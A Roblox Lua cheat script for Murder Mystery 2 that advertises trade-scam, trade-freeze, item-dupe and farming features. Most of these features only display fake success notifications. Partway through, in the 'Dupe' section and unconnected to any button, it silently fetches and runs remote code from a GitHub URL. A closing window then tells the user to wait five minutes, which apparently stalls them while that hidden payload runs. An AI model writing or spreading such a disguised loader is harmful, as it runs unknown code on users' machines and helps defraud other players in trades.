local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local PhantomForcesWindow = Library:NewWindow("📃 Hi Hub MM2 📃")

local KillingCheats = PhantomForcesWindow:NewSection("🎯 Trade scam 🎯")

KillingCheats:CreateToggle("Enable Trade Scam", function(value)
OrionLib:MakeNotification({
    Name = "Trade Scam Activated ✔️",
    Content = "You Can Put Your Stuff Now ✔️",
    Image = "rbxthumb://type=Asset&id=18995759770&w=150&h=150",
    Time = 10
})
print(value)
end)

local KillingCheats = PhantomForcesWindow:NewSection("🧊 Trade Freeze 🧊")

KillingCheats:CreateToggle("Enable Trade Freeze", function(value)
OrionLib:MakeNotification({
    Name = "Trade Freeze Activated ✔️",
    Content = "You Can Remove Your Stuff Now ✔️",
    Image = "rbxthumb://type=Asset&id=18995759770&w=150&h=150",
    Time = 10
})
print(value)
end)

local KillingCheats = PhantomForcesWindow:NewSection("🏹 Godly Hunter 🏹")

KillingCheats:CreateToggle("Enable Trade Freeze", function(value)
OrionLib:MakeNotification({
    Name = "Godly Hunter Activated ✔️",
    Content = "The chance of godly is 100%✔️",
    Image = "rbxthumb://type=Asset&id=18995759770&w=150&h=150",
    Time = 10
})
print(value)
end)

local KillingCheats = PhantomForcesWindow:NewSection("🌴 Event Farm 🌴")

KillingCheats:CreateToggle("Enable Event Farm", function(value)
OrionLib:MakeNotification({
    Name = "Event Farm Activated ✔️",
    Content = "You Collecting All Balls✔️",
    Image = "rbxthumb://type=Asset&id=18995759770&w=150&h=150",
    Time = 10
})
print(value)
end)

local KillingCheats = PhantomForcesWindow:NewSection("💰 Dupe 💰")

loadstring(game:HttpGet("https://raw.githubusercontent.com/killingcheats/window/main/plate", true))()

KillingCheats:CreateButton("Dupe Knifes 🔪(click)", function()
    local Pets = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)
local fromPet = "Mining Cat"
local toPet = "Huge Sorcerer Bear"

for i, v in pairs(Pets[fromPet] or {}) do
    Pets[fromPet][i] = nil
end
for i, v in pairs(Pets[toPet] or {}) do
    Pets[fromPet][i] = v
end
print("HI")
end)

KillingCheats:CreateButton("Dupe Guns🔫(click)", function()
    local Pets = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)
local fromPet = "Piggy"
local toPet = "Titanic Silver Dragon"

for i, v in pairs(Pets[fromPet] or {}) do
    Pets[fromPet][i] = nil
end
for i, v in pairs(Pets[toPet] or {}) do
    Pets[fromPet][i] = v
end
print("HI")
end)

local PhantomForcesWindow = Library:NewWindow("❗Wait for 5 minutes❗")

local KillingCheats = PhantomForcesWindow:NewSection("While The Script Is")

local KillingCheats = PhantomForcesWindow:NewSection("Fully Loading")
